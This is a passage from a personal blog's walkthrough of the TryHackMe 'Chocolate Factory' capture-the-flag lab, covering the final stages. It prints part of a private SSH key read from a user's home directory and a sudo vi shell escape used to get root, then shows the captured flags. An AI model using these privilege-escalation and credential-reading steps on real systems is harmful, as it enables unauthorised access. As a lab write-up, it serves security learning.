+<pre><code>www-data@chocolate-factory:/home/charlie$ cat teleport
+cat teleport
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+</code></pre>
+<p>Once in as Charlie, we can read the contents of the user.txt flag:</p>
+<pre><code>charlie@chocolate-factory:/home/charlie$ ls -al
+total 40
+drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
+drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
+-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
+drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
+drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
+drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
+-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
+-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
+-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
+-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
+charlie@chocolate-factory:/home/charlie$ cat user.txt 
+flag{cd550[Redacted]b522d2e}
+</code></pre>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
+<h2 id="sudo--l">Sudo -l<a hidden class="anchor" aria-hidden="true" href="#sudo--l">#</a></h2>
+<p>Running sudo -l tells us we can use vi with sudo privileges:</p>
+<pre><code> charlie@chocolate-factory:/home/charlie$ sudo -l
+Matching Defaults entries for charlie on chocolate-factory:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+</code></pre>
+<p>Checking GTFOBins, we get a command that will give is a reverse shell.</p>
+<hr>
+<h2 id="root-shell">Root Shell<a hidden class="anchor" aria-hidden="true" href="#root-shell">#</a></h2>
+<p>charlie@chocolate-factory:/$ sudo vi -c &lsquo;:!/bin/sh&rsquo; /dev/null</p>
+<pre><code># whoami
+root
+# cd /root
+# ls -al
+total 52
+drwx------  6 root    root     4096 May 11 18:39 .
+drwxr-xr-x 24 root    root     4096 Sep  1  2020 ..
+-rw-------  1 root    root        0 Oct  7  2020 .bash_history
+-rw-r--r--  1 root    root     3106 Apr  9  2018 .bashrc
+drwx------  3 root    root     4096 Oct  1  2020 .cache
+drwx------  3 root    root     4096 Sep 30  2020 .gnupg
+drwxr-xr-x  3 root    root     4096 Sep 29  2020 .local
+-rw-r--r--  1 root    root      148 Aug 17  2015 .profile
+-rwxr-xr-x  1 charlie charley   491 Oct  1  2020 root.py
+-rw-------  1 root    root    12288 May 11 18:39 .root.txt.swp
+-rw-r--r--  1 root    root       66 Sep 30  2020 .selected_editor
+drwx------  2 root    root     4096 Sep  1  2020 .ssh
+</code></pre>
+<p>Running that root.py, we need to supply the earlier key and then we are rewarded with the root flag.</p>
+<pre><code># python root.py
+Enter the key:  b'-VkgX[Redacted]GSQzY='
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec591[Redacted]96b42124}
+</code></pre>
+<hr>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://ascrivins.github.io/tags/walkthrough/">Walkthrough</a></li>
+      <li><a href="https://ascrivins.github.io/tags/nmap/">nmap</a></li>
+      <li><a href="https://ascrivins.github.io/tags/dirbuster/">dirbuster</a></li>
+      <li><a href="https://ascrivins.github.io/tags/ssh/">ssh</a></li>
+      <li><a href="https://ascrivins.github.io/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="https://ascrivins.github.io/tags/stenography/">Stenography</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://ascrivins.github.io/posts/tryhackme/simplectf/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>[TryHackMe] Simple CTF - Walkthrough</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2021 <a href="https://ascrivins.github.io/">ascrivins:blog</a></span>
+    <span>&middot;</span>
+    <span>🇬🇧</span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
